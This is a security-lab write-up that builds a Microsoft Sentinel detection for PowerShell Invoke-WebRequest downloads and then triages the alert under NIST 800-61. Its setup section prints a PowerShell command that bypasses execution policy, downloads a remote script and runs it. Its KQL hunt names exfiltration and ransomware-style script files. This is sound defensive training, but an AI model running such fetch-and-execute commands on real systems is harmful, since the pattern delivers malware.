<p align="center">
  <a href="https://github.com/Samuel-Cavada" target="_blank">
    <img src="https://img.shields.io/badge/Back_to_Main_Page-000000?style=for-the-badge&logo=github&logoColor=white" alt="Back to Main Page"/>
  </a>
</p>

<h1 align="center">Scenario 2: PowerShell Suspicious Web Request</h1>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Azure%20Sentinel-0078D4?style=for-the-badge&logo=microsoftazure&logoColor=white" alt="Cloud Platform" />
  <img src="https://img.shields.io/badge/OS-Windows%2010-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="OS" />
  <img src="https://img.shields.io/badge/Tool-Microsoft%20Sentinel-00B388?style=for-the-badge&logo=microsoftazure&logoColor=white" alt="Tool" />
  <img src="https://img.shields.io/badge/Tool-Microsoft%20Defender%20for%20Endpoint-2C5EA8?style=for-the-badge&logo=microsoftdefender&logoColor=white" alt="Tool" />
  <img src="https://img.shields.io/badge/Focus-Post%20Exploitation%20Detection-orange?style=for-the-badge" alt="Focus Area" />
</p>

---

## 📌 Project Objective
> Detect and investigate the use of PowerShell's `Invoke-WebRequest` for downloading files from the internet—an activity often used by attackers during post-exploitation phases. This scenario involves creating an analytics rule in Sentinel and working the resulting incident to closure using the NIST 800-61 framework.

---

## 🧰 Tools & Technologies
- **Platform:** Azure
- **OS:** Windows 10
- **Tools:** Microsoft Sentinel, Microsoft Defender for Endpoint, PowerShell
- **Languages/Scripts:** PowerShell, KQL

---

## 🧠 Skills Gained / Focus Areas
- Detected use of `Invoke-WebRequest` via process telemetry
- Created a Sentinel alert rule to detect suspicious PowerShell usage
- Investigated execution of downloaded scripts
- Applied entity mapping and incident triage methodology

---

## 🧪 Environment Setup
> Onboarded Windows 10 VM to Microsoft Defender for Endpoint. Ran the following command to simulate malicious activity:
```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';
powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
```

![Environment Setup](assets/images/setup.jpg)

---

## 🛠️ Walkthrough
1. [Step 1: Create Alert Rule](#step-1-create-alert-rule)
2. [Step 2: Trigger Alert](#step-2-trigger-alert)
3. [Step 3: Work Incident](#step-3-work-incident)
4. [Step 4: Cleanup](#step-4-cleanup)

---

### ✅ Step 1: Create Alert Rule
> KQL used to detect suspicious PowerShell downloads:
```kql
let TargetHostname = "windows-target-1"; 
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated
```

> **Analytics Rule Settings:**
- Run every 4 hours
- Lookup data for last 24 hours
- Map entities:  
  - **Account:** AccountName  
  - **Host:** DeviceName  
  - **Process:** ProcessCommandLine
- Automatically create Incident
- Stop running query after alert is generated
- Group alerts into one Incident per 24 hours

---

### ✅ Step 2: Trigger Alert
> - Simulated execution of `Invoke-WebRequest` via PowerShell
> - Alert triggered and incident created in Sentinel
> - Incident visible in: **Threat Management → Incidents**

---

### ✅ Step 3: Work Incident
> Followed **NIST 800-61** Lifecycle:

**Preparation:**  
- Roles, logging tools, and VM setup confirmed

**Detection & Analysis:**  
- Incident observed: "Josh - PowerShell Suspicious Web Request"  
- Multiple scripts downloaded via PowerShell:
  - `https://raw.githubusercontent.com/.../eicar.ps1`
  - `https://raw.githubusercontent.com/.../portscan.ps1`

> Checked if any downloaded scripts were executed:
```kql
let TargetHostname = "windows-target-1";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```

> Findings:
- `eicar.ps1` and `portscan.ps1` executed by `labuser`  
- `eicar.ps1` simulated malware signature  
- `portscan.ps1` launched internal port scan

**Containment, Eradication, and Recovery:**  
- VM isolated using MDE  
- Anti-malware scan performed  
- Files removed and system returned to normal state  

**Post-Incident:**  
- Policy recommendation: restrict PowerShell usage for non-admin users  
- Alert tuning for frequent script downloads  

**Closure:**  
- Incident marked **True Positive**  
- All notes and queries documented  
- Case closed in Sentinel

---

## 📝 Timeline Summary and Findings
- Alert triggered by `Invoke-WebRequest` detection  
- Multiple suspicious scripts were downloaded and run  
- Executed scripts confirmed through process telemetry  
- Incident triaged and remediated successfully  

---

## 📎 References
- [MITRE ATT&CK: T1059.001 – PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [Advanced Hunting – DeviceProcessEvents]()
